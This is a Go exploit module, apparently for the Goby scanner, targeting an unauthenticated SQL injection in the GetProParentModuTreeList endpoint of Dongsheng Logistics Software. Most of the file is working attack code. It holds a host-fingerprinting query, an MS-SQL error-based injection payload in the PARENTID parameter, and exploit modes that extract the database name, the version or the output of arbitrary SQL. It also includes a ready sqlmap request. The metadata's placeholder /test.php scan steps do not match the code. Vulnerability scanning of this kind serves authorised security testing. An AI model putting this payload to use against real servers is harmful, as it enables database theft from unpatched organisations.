package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Dongsheng Logistics Software /MvcShipping/MsBaseInfo/GetProParentModuTreeList SQL Injection Vulnerability",
    "Description": "<p>Dongsheng Logistics Software is a logistics management software developed by Qingdao Dongsheng Weiye Software Co., Ltd., which integrates various functions such as order management, warehouse management, and transportation management. The company was founded in November 2004 (formerly known as Qingdao Jinghong Logistics Information Technology Co., Ltd.), focusing on products and services related to shipping and logistics. The freight forwarding version of Dongsheng Logistics Information Management System adopts MS-SQLserver large database, combined with B/S+C/S program architecture, with simple, rigorous, flexible process and powerful functions. Has a good reputation and wide coverage.Dongsheng Logistics software has a SQL injection vulnerability in the GetProParentModuTreeList  interface. Unauthenticated remote attackers can not only exploit the SQL injection vulnerability to obtain information from the database (such as administrator backend passwords, site user personal information), but also write trojans to the server in high privilege situations, further obtaining server system privileges</p>",
    "Product": "Qingdao Dongsheng Weiye Software",
    "Homepage": "http://www.dongshengsoft.com/",
    "DisclosureDate": "2024-11-13",
    "PostTime": "2024-11-19",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "(body=\"FeeCodes/CompanysAdapter.aspx\" || body=\"dhtmlxcombo_whp.js\" || body=\"dongshengsoft\" || body=\"theme/dhtmlxcombo.css\") && body=\"东胜\"",
    "GobyQuery": "(body=\"FeeCodes/CompanysAdapter.aspx\" || body=\"dhtmlxcombo_whp.js\" || body=\"dongshengsoft\" || body=\"theme/dhtmlxcombo.css\") && body=\"东胜\"",
    "Level": "2",
    "Impact": "<p>Attackers can access sensitive information in the database, such as user passwords, bank accounts, etc., leading to the leakage of user privacy.</p>",
    "Recommendation": "<p>1. Strictly verify and filter user input to ensure the legitimacy and security of input data. </p><p> 2. Close the Internet exposure or upgrade the access rights of the interface settings to the security version. </p><p> 3. The manufacturer has not yet released the latest version, please follow the official website <a href=\"http://www.dongshengsoft.com/\">http://www.dongshengsoft.com/</a></p>",
    "References": [
        "https://github.com/wy876/POC/blob/main/%E4%B8%9C%E8%83%9C%E7%89%A9%E6%B5%81%E8%BD%AF%E4%BB%B6/%E4%B8%9C%E8%83%9C%E7%89%A9%E6%B5%81%E8%BD%AF%E4%BB%B6GetProParentModuTreeList%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "db_name,version,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT (CHAR(113)+CHAR(98)+CHAR(122)+@@version",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "东胜物流软件 /MvcShipping/MsBaseInfo/GetProParentModuTreeList SQL 注入漏洞",
            "Product": "青岛东胜伟业软件",
            "Description": "<p>东胜物流软件是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。该公司初创于2004年11月（前身为青岛景宏物流信息技术有限公司），专注于航运物流相关环节的产品和服务。东胜物流信息管理系统货代版采用MS-SQLserver大型数据库，结合B/S+C/S的程序架构，流程简捷、严密、灵活，功能强大。具有良好的口碑和广泛的覆盖率。<br>东胜物流软件 GetProParentModuTreeList&nbsp; 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用&nbsp;SQL&nbsp;注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限<br></p>",
            "Recommendation": "<p>1、对用户输入进行严格的验证和过滤，确保输入数据的合法性和安全性。</p><p>2、关闭互联网暴露面或接口设置访问权限升级至安全版本。</p><p>3、该厂商还未发布最新版本，关注官网 <a href=\"http://www.dongshengsoft.com/\">http://www.dongshengsoft.com/</a></p>",
            "Impact": "<p>攻击者可以读取数据库中的敏感信息，如用户密码、银行账户等，导致用户隐私泄露。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Dongsheng Logistics Software /MvcShipping/MsBaseInfo/GetProParentModuTreeList SQL Injection Vulnerability",
            "Product": "Qingdao Dongsheng Weiye Software",
            "Description": "<p>Dongsheng Logistics Software is a logistics management software developed by Qingdao Dongsheng Weiye Software Co., Ltd., which integrates various functions such as order management, warehouse management, and transportation management. The company was founded in November 2004 (formerly known as Qingdao Jinghong Logistics Information Technology Co., Ltd.), focusing on products and services related to shipping and logistics. The freight forwarding version of Dongsheng Logistics Information Management System adopts MS-SQLserver large database, combined with B/S+C/S program architecture, with simple, rigorous, flexible process and powerful functions. Has a good reputation and wide coverage.Dongsheng Logistics software has a SQL injection vulnerability in the GetProParentModuTreeList&nbsp; interface. Unauthenticated remote attackers can not only exploit the SQL injection vulnerability to obtain information from the database (such as administrator backend passwords, site user personal information), but also write trojans to the server in high privilege situations, further obtaining server system privileges<br></p>",
            "Recommendation": "<p>1. Strictly verify and filter user input to ensure the legitimacy and security of input data.&nbsp;</p><p>&nbsp;2. Close the Internet exposure or upgrade the access rights of the interface settings to the security version.&nbsp;</p><p>&nbsp;3. The manufacturer has not yet released the latest version, please follow the official website <a href=\"http://www.dongshengsoft.com/\">http://www.dongshengsoft.com/</a><br></p>",
            "Impact": "<p>Attackers can access sensitive information in the database, such as user passwords, bank accounts, etc., leading to the leakage of user privacy.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9973"
}`

	setSqlPayload_wV7lbsgw := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(url)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		defineHeader := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36",
			"Accept-Encoding": "gzip, deflate",
			"Connection":      "close",
		}
		rawPayload := fmt.Sprintf("' AND 4757 IN (%s+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (4757=4757) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(98)+CHAR(106)+CHAR(113))) AND 'KJaG'='KJaG", sql)
		urlget := "/MvcShipping/MsBaseInfo/GetProParentModuTreeList?PARENTID=" + url.QueryEscape(rawPayload)
		resp, err = setGetRequest(hostInfo, urlget, defineHeader)

		if resp == nil {
			return nil, "", errors.New("Fail")
		}

		if err != nil {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/MvcShipping/MsBaseInfo/GetProParentModuTreeList"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			checkValue := goutils.RandomHexString(6)
			hash := md5.New()
			hash.Write([]byte(checkValue))
			content := hex.EncodeToString(hash.Sum(nil)) //装换为md5值 后续用与验证

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := "SELECT (CHAR(113)+CHAR(98)+CHAR(122)+LOWER(CONVERT(VARCHAR(32), HASHBYTES('MD5', '" + checkValue + "'), 2))"

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			sendPayload := setSqlPayload_wV7lbsgw
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}

			if !strings.Contains(resp.RawBody, content) {
				return false
			}

			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			defaultModeMap := map[string]string{
				"db_name": "SELECT (CHAR(113)+CHAR(98)+CHAR(122)+DB_NAME()",
				"version": "SELECT (CHAR(113)+CHAR(98)+CHAR(122)+@@version",
			}
			//content := "XPATH syntax error"
			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "GET /MvcShipping/MsBaseInfo/GetProParentModuTreeList?PARENTID=%27+AND+4757+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28122%29%2B%40%40version%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%284757%3D4757%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29+AND+%27KJaG%27%3D%27KJaG HTTP/1.1\n" +
				"Host: " + expResult.HostInfo.HostInfo + "\n" +
				"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36\n" +
				"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\n" +
				"Accept-Encoding: gzip, deflate, br\n" +
				"x-auth-token: 36ef438edd50bf8dd51fba642a82c3b7d272ff38\n" +
				"Content-Type: text/html; charset=utf-8"

			// 3.配置正则语句，从响应包中提取出数据
			regular := `qbz(.*?)xq1qqbjq`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayload_wV7lbsgw
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" {
				sql := goutils.B2S(ss.Params["custom"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "db_name" {
				sql := defaultModeMap["db_name"]
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "version" {
				sql := defaultModeMap["version"]
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				output = strings.ReplaceAll(output, "<br>", "")
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
